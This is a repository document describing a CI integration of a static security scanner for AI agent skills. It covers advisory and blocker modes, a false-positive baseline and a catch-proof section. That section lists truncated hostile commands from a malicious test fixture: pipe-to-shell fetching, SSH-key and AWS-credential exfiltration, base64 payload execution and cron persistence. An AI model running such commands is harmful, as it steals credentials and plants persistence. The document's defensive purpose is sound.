# SkillSpector CI Security Scan — Phase K

> **NVIDIA SkillSpector** ([NVIDIA/skillspector](https://github.com/NVIDIA/skillspector), Apache-2.0)
> runs as a CI security layer on skill content PRs. It is **isolated** from the API app
> (separate venv, separate dependency tree, no app imports).

## What it does

SkillSpector is a static security scanner for AI agent skills with 64 vulnerability
patterns across 16 categories: prompt injection, data exfiltration, privilege escalation,
supply chain, excessive agency, MCP poisoning, and more.

In this repo it runs in `--no-llm` (static-only) mode: deterministic, zero token cost,
works without any API keys.

## Advisory vs. blocker mode

| Mode | `SKILLSPECTOR_BLOCK_ON_HIGH` | Behaviour |
|------|-------------------------------|-----------|
| **Advisory** (default) | `false` (default) | Findings shown in SARIF/Security tab; CI always green |
| **Blocker** | `true` | Any un-suppressed HIGH/CRITICAL finding fails the check |

**To flip to blocker:** set `SKILLSPECTOR_BLOCK_ON_HIGH=true` in the GitHub repo's
[Actions variables](https://github.com/wisechef-ai/recipes-api/settings/variables/actions)
(not secrets — it's not sensitive). A single variable change with immediate effect.

## Files

| File | Purpose |
|------|---------|
| `.github/workflows/skillspector-scan.yml` | CI workflow — runs on PRs touching skill content |
| `scripts/skillspector_ci.py` | Thin wrapper: runs SkillSpector, applies baseline, emits GitHub annotations |
| `.skillspector-baseline.json` | Suppression baseline for known-good false positives |
| `tests/test_skillspector_ci.py` | Pytest suite: catch proof + false-positive-clean proof |
| `tests/fixtures/skills/malicious-test-skill/` | Deliberately malicious skill fixture for the catch proof |

## The baseline (`.skillspector-baseline.json`)

The baseline suppresses known false positives from the real skill catalog. Every entry
has a documented rationale. The format is:

```json
{
  "suppressed": {
    "RULE_ID": ["file:line", "file:line"],
    "RULE_ID": ["*"]
  },
  "_rationale": {
    "RULE_ID/file:line": "Why this is a false positive"
  }
}
```

### Current suppressions (2026-06-02)

| Rule | Location | Rationale |
|------|----------|-----------|
| P2 | `asciinema-demo.svg:20` | SVG HTML comments in demo animation — not AI-readable instruction plane |
| TM1 | `QUICKSTART-share.md:25` | DELETE HTTP method in REST docs — documentation, not shell execution |
| TM1 | `mcp/03-cookbook-share.sh:10` | DELETE in a comment block — never executed |
| E1 | `QUICKSTART-publisher.md:58` | curl POST to `recipes.wisechef.ai` in docs — legitimate first-party API |
| E1 | `mcp/03-cookbook-share.sh:37` | curl to our own API — legitimate example |
| SC2 | `mcp/03-cookbook-share.sh:37,66,83,104` | `curl … | python3 -m json.tool` — pretty-printing JSON, not executing remote code |
| TT3 | `rest/0*.py` | API key sent as auth header to our own API — correct authentication pattern |
| E2 | `rest/0*.py` | `os.environ.get('RECIPES_API_KEY')` — reading own API key for authentication |

### Updating the baseline

When you add new skill content that triggers a false positive:

1. Run the scan locally: `python scripts/skillspector_ci.py docs/recipes-skill/ --sarif-out /tmp/scan.sarif`
2. Inspect the finding and confirm it's a false positive.
3. Add an entry to `.skillspector-baseline.json` with a rationale.
4. Re-run and confirm it suppresses correctly.
5. Include the baseline update in the same PR as the skill content change.

## Catch proof

The malicious test fixture at `tests/fixtures/skills/malicious-test-skill/` contains:
- `curl -fsSL ... | bash` (supply-chain attack)
- `cat ~/.ssh/id_rsa | base64 | curl -X POST ...` (SSH key exfiltration)
- `cat ~/.aws/credentials >> /tmp/...` (AWS credential harvest)
- `eval "$(echo '...' | base64 -d)"` (base64-encoded payload execution)
- `echo "*/5 * * * * curl ... | bash" | crontab -` (C2 persistence)

SkillSpector flags this CRITICAL (score=100) with findings:
- **SC2** (External Script Fetching / pipe-to-shell) — lines 5, 15
- **PE3** (Credential Access — `~/.ssh/id_rsa`, `~/.aws/credentials`) — lines 8, 9
- **E1** (External Transmission) — line 8
- **TM2** (Chaining Abuse) — line 5
- **LP1** (Undeclared shell capability) — whole file

Run the proof yourself:
```bash
source .skillspector-venv/bin/activate
skillspector scan tests/fixtures/skills/malicious-test-skill --no-llm --format json
# → risk_score: 100, severity: CRITICAL, 8 findings
```

## Architecture: why SkillSpector doesn't touch `app/security_scan.py`

`app/security_scan.py` is a **hot-path stdlib-only reject wall**: fast, no network calls,
runs synchronously on every tarball upload. It stays.

SkillSpector is the **deep CI layer**: runs asynchronously on PRs, richer patterns,
SARIF output for the Security tab. The two layers are orthogonal and complement each other.

## SARIF in the GitHub Security tab

The workflow uploads two SARIF reports per run (categories `skillspector-skill` and
`skillspector-examples`). To view them:

1. Go to the repo → **Security** → **Code scanning alerts**
2. Filter by tool: `SkillSpector`

In advisory mode, findings appear as open alerts but don't block merging.
In blocker mode, alerts that aren't in the baseline will cause the check to fail.

## Dependencies (pinned)

SkillSpector is installed from a pinned commit in an isolated venv:

```
skillspector @ git+https://github.com/NVIDIA/skillspector.git@2eb844780ab163f01468ecf142c40a2ec0fcaec0
version: 2.0.0
```

This venv (`.skillspector-venv/`) is cached by the CI workflow and is **not** part of
the API app's requirements. Never add skillspector to `requirements.txt`.
